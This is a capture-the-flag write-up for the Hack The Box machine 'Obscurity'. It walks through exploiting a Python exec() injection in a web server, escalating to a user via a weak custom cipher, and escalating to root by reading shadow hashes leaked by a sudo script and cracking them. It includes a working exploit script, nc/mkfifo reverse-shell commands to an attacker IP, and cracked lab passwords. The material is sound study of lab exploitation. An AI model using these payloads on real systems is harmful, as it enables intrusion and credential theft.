# Obscurity

First, edit your `/etc/hosts` to make `obscurity.htb` resolve to `10.10.10.168`.

### Enumeration

Kick it off with a standard `nmap` scan.

```bash
$ nmap -vvv -sCV -oN obscurity.nmap obscurity.htb
# Nmap 7.80 scan initiated Thu Apr  9 02:28:13 2020 as: nmap -vvv -sCV -oN obscurity.nmap 10.10.10.168
Nmap scan report for 10.10.10.168
Host is up, received conn-refused (0.046s latency).
Scanned at 2020-04-09 02:28:14 CDT for 15s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT     STATE  SERVICE    REASON       VERSION
22/tcp   open   ssh        syn-ack      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMGbaGqnhJ5GoiEH4opql41JoOBmB089aA2wQZgp5GCxf3scJti3BWS30ugrj2PBMydulKmeiAbHWA37ojLyAJxSdvyWrPqneEZfdaMCm/9NPnPSouZgQKLoOg/w8DEPeXfon8bxGYOt3HMXtVMk04/kt09ad7E2Eej8WzAp2k3JJX17ndZL0S5UNDJFyh6pHhGqCtjOapLGb1QwS7BDw+kHiZrkZbDRa1rMv5a/QoljgOIq0byvm5jEVe4NhKKfgwH7kXEU1DAlXmWYzsq/ZdhhwutrjbDam5alw4UAE/35DcPlnVl/7eRK6RIARJPZEQ0O64ixlzbAfIcDGi8GOr
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAygZOWHjNzQWySvfTX7s9Cnz0eSrc9IS/8wk126Wby5EAUmSalXlAL5WETz8nu/JN8nVpgHYEW6/mZm071xMd0=
|   256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ6lPjlgfOScC0NXPX926fST+MXZViZJzBQPXDWsdHuw
80/tcp   closed http       conn-refused
8080/tcp open   http-proxy syn-ack      BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 09 Apr 2020 07:31:36
|     Server: BadHTTPServer
|     Last-Modified: Thu, 09 Apr 2020 07:31:36
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|     <div class="sk-spinner sk-spinner-wordpress">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 09 Apr 2020 07:31:37
|     Server: BadHTTPServer
|     Last-Modified: Thu, 09 Apr 2020 07:31:37
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener conn-refused
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=4/9%Time=5E8ECE98%P=x86_64-pc-linux-gnu%r(Get
SF:Request,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Thu,\x2009\x20Apr\x20202
SF:0\x2007:31:36\nServer:\x20BadHTTPServer\nLast-Modified:\x20Thu,\x2009\x
SF:20Apr\x202020\x2007:31:36\nContent-Length:\x204171\nContent-Type:\x20te
SF:xt/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"e
SF:n\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n
SF:\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20nam
SF:e=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templa
SF:te\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20sty
SF:lesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boot
SF:strap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-aw
SF:esome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templat
SF:emo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=
SF:\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<d
SF:iv\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-
SF:wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20T
SF:hu,\x2009\x20Apr\x202020\x2007:31:37\nServer:\x20BadHTTPServer\nLast-Mo
SF:dified:\x20Thu,\x2009\x20Apr\x202020\x2007:31:37\nContent-Length:\x2041
SF:71\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<
SF:title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conten
SF:t=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEa
SF:sy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-prof
SF:ile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styleshe
SF:et\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"s
SF:croll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20s
SF:ection\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk
SF:-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  9 02:28:29 2020 -- 1 IP address (1 host up) scanned in 15.52 seconds
```

Port `8080` seems worth checking out in more depth. Opening a browser and navigating to `http://10.10.10.168:8080` shows us a web page that contains this message: `Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory`. Let's do some webserver fuzzing.

```bash
$ wfuzz -c -w /usr/share/wordlists/wfuzz/general/medium.txt --sc 200 obscurity.htb:8080/FUZZ/SuperSecureServer.py

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
Total requests: 1659

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000448:   200        170 L    498 W    5892 Ch     "develop"

Total time: 25.36840
Processed Requests: 1659
Filtered Requests: 1658
Requests/sec.: 65.39630
```

This command tells `wfuzz` to use the `medium.txt` wordlist, substituting in words from the list in place of `FUZZ` in the URL, and only showing responses that have a response code of `200`. It spits out one result, which leads us to the dev folder path: `develop`. Navigating to `http://obscurity.htb:8080/develop/` gives us a 404, but `http://obscurity.htb:8080/develop/SuperSecureServer.py` shows us the source code for the server. Let's download it and take a look.


```bash
$ wget http://obscurity.htb:8080/develop/SuperSecureServer.py
```

### Exploitation

After combing through the code for a bit, we come across this snippet:

```python
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
```

That `exec` call is how we're going to break out of this server. We just need to figure out how to get our command in there. From the python man page about exec:

```bash
exec(source, globals=None, locals=None, /)
    Execute the given source in the context of globals and locals.

    The source may be a string representing one or more Python statements
    or a code object as returned by compile().
    The globals must be a dictionary and locals can be any mapping,
    defaulting to the current globals and locals.
    If only globals is given, locals defaults to it.
```

I launch a `python` interpreter to play around with this for a bit:

```python
$ python3
Python 3.7.7 (default, Mar 10 2020, 13:18:53)
[GCC 9.2.1 20200306] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> info = "output = 'Document: {}'"
>>> info.format("', print(3)'")
"output = 'Document: ', print(3)''"
>>> exec(info.format("', print(3)'"))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1
    output = 'Document: ', print(3)''
                                    ^
SyntaxError: invalid syntax
>>> info.format("', print(3), '")
"output = 'Document: ', print(3), ''"
>>> exec(info.format("', print(3), '"))
3
```

And there we have code execution. Let's build this out into code execution to get a reverse shell. First, we need a reverse shell.

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 1234 >/tmp/f
```

Now, let's build out a PoC to get system execution in the context of the server. I set up scaffolding just like the server and created the following script.


```python
import os
import urllib.parse

info = "output = 'Document: {}'" # Keep the output for later debug

########
# WORKS
########

#  path = """', print(3), '"""
#  path = """', print(3), print(4), '"""
#  path = """', print(3)
#  print(4), '"""
#  path = """', open('a', 'w'), '"""
#  path = """', os.system('echo "hi"'), '"""
path = """', os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 1234 >/tmp/f'), '"""
path = urllib.parse.unquote(path)

##############
# DOESN'T WORK
##############

#  path = """', x = 4, print(x), '"""

# Can't import anything! This fails!!
#  path = """', import socket, '"""


# Theoretically complete
#  path = """', s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#  s.connect(('10.10.14.5', 1234))
#  os.dup2(s.fileno(),0)
#  os.dup2(s.fileno(),1)
#  os.dup2(s.fileno(),2)
#  p=subprocess.call(['/bin/bash', '-i']), '"""

cmd = info.format(path)
print(cmd)
exec(cmd) # This is how you do string formatting, right?
```

When running this script with a `nc` listener in another `tmux` pane, a reverse shell is created. Now, let's figure out how to get the string we've assigned to path into the `path` variable in the script. Tracing the execution back, we have:

```python
def serveDoc(self, path, docRoot) # here's the path we need to get it into

# which comes from...
def handleRequest(self, request, conn, address):
        if request.good:
            # ...
            document = self.serveDoc(request.doc, DOC_ROOT)

# So, we need request.good to be True. request.good is set here...
class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

# Let's read through parseRequest...
def parseRequest(self, request):        
    req = request.strip("\r").split("\n")
    method,doc,vers = req[0].split(" ")
    header = req[1:-3]
    body = req[-1]
    headerDict = {}
    for param in header:
        pos = param.find(": ")
        key, val = param[:pos], param[pos+2:]
        headerDict.update({key: val})
    return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}

# Alright, let's break this down.
req = request.strip("\r").split("\n") # Remove carriage returns and split on newlines
method,doc,vers = req[0].split(" ")   # method, doc and vers are on the first line, separated by spaces
header = req[1:-3] # header is lines 1 to -3
body = req[-1]     # body is the last line
```

So, our request to the server must be something along the lines of:

```python
import requests
import urllib
import os

url = 'http://obscurity.htb:8080/'
path = 'junk\''+'\nos.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 1234 >/tmp/f")\njunk=\''

payload = urllib.parse.quote(path)
full_payload = url + payload

print(f"Full payload: {full_payload}")
resp = requests.get(full_payload)
print(resp.text)
```

There are two tricky parts of this exploit that must be present for this to work -- both occurrences of the word `junk`. The first `junk\`` exists because otherwise the string `'''` is an invalidly terminated string. The `'` must be in the request to terminate the `'` in `'Document:`, so we are forced to fill in the space between the two "outer" `'`s with some junk. The second `\njunk=\'` because otherwise the server rejects the response. Any string that is at least one character long can be used in place of `junk`, but the `\n` and the `\'` must be there.

After testing this exploit locally, by editing the sever script to have a main method and adding some debug print statements, we ensure that this exploit works. For completeness, this is the main method I added to the server script for testing.

```python
if __name__ == "__main__":
    s = Server("127.0.0.1", 8081)
    s.listen()
```

Let's start a listener in one `tmux` pane and run this exploit from another.

```bash
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.168] 54458
www-data@obscure:/$
```

Let's quickly upgrade our shell.

```bash
www-data@obscure:/$ python3 -c 'import pty; pty.spawn("/bin/sh")'
www-data@obscure:/$ export TERM=xterm-256color
www-data@obscure:/$ export SHELL=bash
```

Sweet. Let's get user privileges.

### User Privilege Escalation

In `/home/robert`, we find a series of interesting files.

```bash
$ ls
check.txt
out.txt
passwordreminder.txt
SuperSecureCrypt.py

$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
```

`out.txt` and `passwordreminder.txt` are encrypted blobs. Let's see if we can crack this "encryption".

```bash
$ python3 SuperSecureCrypt.py -i out.txt -o /tmp/key -k "$(cat check.txt)" -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to /tmp/key...

$ cat /tmp/key
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovicha
```

This looks like something outputted by a simple cipher. Maybe the repeating substring is the key...

```bash
$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o password.txt -k "alexandrovich" -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to password.txt...

$ cat password.txt
SecThruObsFTW
```

Yep. 

```bash
www-data@obscure:/home/robert$ su robert
Password: # SecThruObsFTW
robert@obscure:~$ wc user.txt
 1  1 33 user.txt
```

### Root Privilege Escalation

Now let's get root. There's an interesting directory in `/home/robert`:

```bash
robert@obscure:~/BetterSSH$ ll
total 12
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 ./
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ../
-rwxr-xr-x 1 root   root   1805 Oct  5  2019 BetterSSH.py
```

First, let's move `LinEnum.sh` over, make it executable, and run it. We spot this interesting line in the output:

```bash
[+] We can sudo without supplying a password!
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

Let's take a look at that script.

```python
with open('/etc/shadow', 'r') as f:
    data = f.readlines()
data = [(p.split(":") if "$" in p else None) for p in data]
passwords = []
for x in data:
    if not x == None:
        passwords.append(x)

passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
with open('/tmp/SSH/'+path, 'w') as f:
    f.write(passwordFile)
```

So this script reads `/etc/shadow` and writes its content to a random file in `tmp`. Scandalous. We know the password for `robert`, so we can set up a quick `bash` script to read through the files in `/tmp/SSH` and print their contents before they're deleted.

```bash
robert@obscure:~$ mkdir /tmp/SSH
robert@obscure:~$ while sleep 0.1; do cat /tmp/SSH/* 2>/dev/null; done
```

Now, we open a new session and run:

```bash
robert@obscure:~/BetterSSH$ /usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
username: robert
password: SecThruObsFTW
Authed!
```

On our `cat /tmp/SSH/*` tab, we see the following output:

```bash
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```

We can crack that `root` shadow hash with `john`.

```bash
$ echo "$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1" > root-password.hash
$ john -w=~/tools/wordlists/rockyou.txt root-password.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (?)
1g 0:00:00:00 DONE (2020-04-24 04:06) 2.272g/s 1163p/s 1163c/s 1163C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
robert@obscure:~/BetterSSH$ su root
Password: # mercedes
root@obscure:/home/robert/BetterSSH# wc /root/root.txt
 1  1 33 /root/root.txt
root@obscure:/home/robert/BetterSSH#
```

And there we have it.
